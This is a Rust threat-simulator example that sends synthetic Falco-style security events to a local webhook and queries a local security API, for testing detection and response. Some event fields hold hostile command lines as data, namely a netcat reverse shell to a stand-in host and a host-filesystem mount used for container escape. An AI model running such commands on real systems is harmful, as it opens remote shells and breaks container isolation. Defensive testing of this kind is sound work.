// Симулятор угроз для тестирования Enterprise Security Stack
// 
// Использование:
//   cargo run --example threat_simulator

use serde_json::json;
use std::time::Duration;
use tokio::time::sleep;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🧪 Enterprise Security Stack - Threat Simulator");
    println!("================================================\n");

    let client = reqwest::Client::new();
    let api_url = "http://localhost:3000";
    let webhook_url = "http://localhost:8080/falco-events";

    // Проверка доступности
    println!("1️⃣  Проверка доступности API...");
    match client.get(format!("{}/health", api_url)).send().await {
        Ok(resp) if resp.status().is_success() => {
            println!("✅ API доступен\n");
        }
        _ => {
            eprintln!("❌ API недоступен. Запустите приложение сначала.");
            return Ok(());
        }
    }

    // Начальный статус
    println!("2️⃣  Начальный статус безопасности:");
    let status = client
        .get(format!("{}/api/security/status", api_url))
        .send()
        .await?
        .json::<serde_json::Value>()
        .await?;
    println!("{}\n", serde_json::to_string_pretty(&status)?);

    // Симуляция 1: Bruteforce
    println!("3️⃣  Симуляция Bruteforce атаки...");
    for i in 1..=15 {
        let event = json!({
            "time": chrono::Utc::now().to_rfc3339(),
            "rule": format!("Failed Login Attempt #{}", i),
            "priority": "Critical",
            "output": format!("Failed SSH login from 192.168.1.100 (attempt {})", i),
            "source": "syscall",
            "tags": ["bruteforce", "authentication"],
            "output_fields": {
                "fd.sip": "192.168.1.100",
                "proc.name": "sshd",
                "user.name": "admin"
            },
            "hostname": "web-server-01",
            "container_id": "container-web-01",
            "process_pid": 1000 + i,
            "syscall": "connect"
        });

        client
            .post(webhook_url)
            .json(&event)
            .send()
            .await?;
        
        print!(".");
        std::io::Write::flush(&mut std::io::stdout())?;
        sleep(Duration::from_millis(100)).await;
    }
    println!(" ✅ Отправлено 15 событий\n");
    sleep(Duration::from_secs(2)).await;

    // Симуляция 2: Lateral Movement
    println!("4️⃣  Симуляция Lateral Movement...");
    let hosts = vec!["node-01", "node-02", "node-03", "node-04"];
    for (i, host) in hosts.iter().enumerate() {
        let event = json!({
            "time": chrono::Utc::now().to_rfc3339(),
            "rule": "Suspicious Process Spawning",
            "priority": "Alert",
            "output": format!("Process 'nc' spawned on {}", host),
            "source": "syscall",
            "tags": ["lateral_movement", "network"],
            "output_fields": {
                "proc.name": "nc",
                "proc.cmdline": "nc -e /bin/bash 10.0.0.1 4444"
            },
            "hostname": host,
            "container_id": format!("container-{}", i),
            "process_pid": 2000 + i,
            "syscall": "execve"
        });

        client
            .post(webhook_url)
            .json(&event)
            .send()
            .await?;
        
        println!("  📡 Событие на {}", host);
        sleep(Duration::from_millis(500)).await;
    }
    println!("✅ Lateral movement обнаружен\n");
    sleep(Duration::from_secs(2)).await;

    // Симуляция 3: Data Exfiltration
    println!("5️⃣  Симуляция Data Exfiltration...");
    let event = json!({
        "time": chrono::Utc::now().to_rfc3339(),
        "rule": "Large Outbound Data Transfer",
        "priority": "Emergency",
        "output": "Detected 500MB outbound transfer to 203.0.113.42:443",
        "source": "syscall",
        "tags": ["data_exfiltration", "network_anomaly"],
        "output_fields": {
            "fd.sip": "203.0.113.42",
            "fd.sport": "443",
            "fd.bytes": "524288000",
            "proc.name": "curl"
        },
        "hostname": "db-server-01",
        "container_id": "container-db-01",
        "process_pid": 3000,
        "syscall": "sendto"
    });

    client
        .post(webhook_url)
        .json(&event)
        .send()
        .await?;
    println!("✅ Data exfiltration обнаружен\n");
    sleep(Duration::from_secs(2)).await;

    // Симуляция 4: Container Escape
    println!("6️⃣  Симуляция Container Escape попытки...");
    let event = json!({
        "time": chrono::Utc::now().to_rfc3339(),
        "rule": "Container Escape Attempt",
        "priority": "Critical",
        "output": "Detected mount of host filesystem in container",
        "source": "syscall",
        "tags": ["container_escape", "privilege_escalation"],
        "output_fields": {
            "proc.name": "mount",
            "proc.cmdline": "mount /dev/sda1 /mnt/host"
        },
        "hostname": "worker-node-03",
        "container_id": "suspicious-container",
        "process_pid": 4000,
        "syscall": "mount"
    });

    client
        .post(webhook_url)
        .json(&event)
        .send()
        .await?;
    println!("✅ Container escape попытка обнаружена\n");
    sleep(Duration::from_secs(2)).await;

    // Проверка предсказаний
    println!("7️⃣  Получение AI предсказаний угроз...");
    let predictions = client
        .get(format!("{}/api/security/predictions", api_url))
        .send()
        .await?
        .json::<serde_json::Value>()
        .await?;
    println!("{}\n", serde_json::to_string_pretty(&predictions)?);

    // Проверка инцидентов
    println!("8️⃣  История инцидентов и реагирования...");
    let incidents = client
        .get(format!("{}/api/security/incidents", api_url))
        .send()
        .await?
        .json::<serde_json::Value>()
        .await?;
    println!("{}\n", serde_json::to_string_pretty(&incidents)?);

    // Финальный статус
    println!("9️⃣  Финальный статус безопасности:");
    let final_status = client
        .get(format!("{}/api/security/status", api_url))
        .send()
        .await?
        .json::<serde_json::Value>()
        .await?;
    println!("{}\n", serde_json::to_string_pretty(&final_status)?);

    // Ручное реагирование
    println!("🔟 Тест ручного реагирования...");
    let response = client
        .post(format!("{}/api/security/respond", api_url))
        .json(&json!({
            "threat_type": "bruteforce",
            "target": "192.168.1.100"
        }))
        .send()
        .await?
        .json::<serde_json::Value>()
        .await?;
    println!("{}\n", serde_json::to_string_pretty(&response)?);

    println!("✅ Тестирование завершено!");
    println!("\n📊 Итоги:");
    println!("  - Симулировано атак: 4 типа");
    println!("  - Отправлено событий: ~25");
    println!("  - Проверено API endpoints: 5");
    println!("\n💡 Проверьте логи приложения для деталей обработки");

    Ok(())
}
